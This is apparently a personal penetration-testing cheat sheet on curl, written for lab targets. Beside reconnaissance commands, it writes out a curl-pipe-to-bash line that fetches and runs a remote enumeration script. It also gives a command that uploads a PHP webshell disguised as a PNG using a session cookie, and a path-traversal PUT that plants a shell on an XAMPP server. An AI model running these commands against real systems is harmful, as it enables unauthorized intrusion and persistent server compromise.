---
type: tool
category: web
tags:
  - tool
---
# Overview
Important to Know. Curl does not execute http redirects.
This means that if, for example, you access http://domain.com/admin_h1dd3n, the web server will look for a file named “admin_h1dd3n.” If, on the other hand, you want to access the “admin_h1dd3n” directory, you must include a trailing `/`: http://domain.com/admin_h1dd3n/.

## Quick Commands
Banner grabbing / web-header with vhost:
```bash
curl -IL 10.129.42.195 -H "dev.inlanefreight.local"
```

^47e6b0

Grab content of "robots.txt" and/or "sitemap.xml" to reveal potential subpages of e.g. VHOST:
```bash
curl -i domain.com:port/robots.txt 
```

^89def0
### Download a file using Curl
```bash
curl -o /tmp/NEW-FILENAME.SH https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

### Fileless Download with Curl
Execute file directly with "|", instead of downloading it/storing it to the filessystem:
```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

## Uploading File to Webserver using Session-Cookie over HTTPS
Here is an example how a file(in this case a php webshell) can be uploaded using a session cookie over https (in case we are already logged in on the browser, the session cookie can be found her in firefox: **f12 / Storage / Cookies / PHPSESSID**):
```bash
curl -k -i -X POST "https://10.129.201.101/lib/crud/vendors.crud.php" \
  -H "Cookie: PHPSESSID=6c1f6468e9b3d6037f2df1f0db02ce16" \
  -F "vendorName=TestVendor" \
  -F "nodeId=1" \
  -F "vendorLogo=@shell.php;filename=shell.php;type=image/png" \
  -F "add=Add"
```

^7d80ca

## Path traversal on Website
This is an Example of a `XAMPP/Apache` webserver with authentication - CVE-2022-22836
https://www.exploit-db.com/exploits/50652
```bash
curl -k -X PUT -H "Host: 10.129.219.75" --basic -u fiona:987654321 --data-binary "@SHELL-FILE" --path-as-is https://10.129.219.75/../../xampp/htdocs/shell.php
```

## Important Parameter
curl 
	`-H "Host: VHOST"` = -H allows changing the application-header. The attribute "Host:" defines the VHOST
	`-o /example/examplefile.txt` = stands for "Output-File" 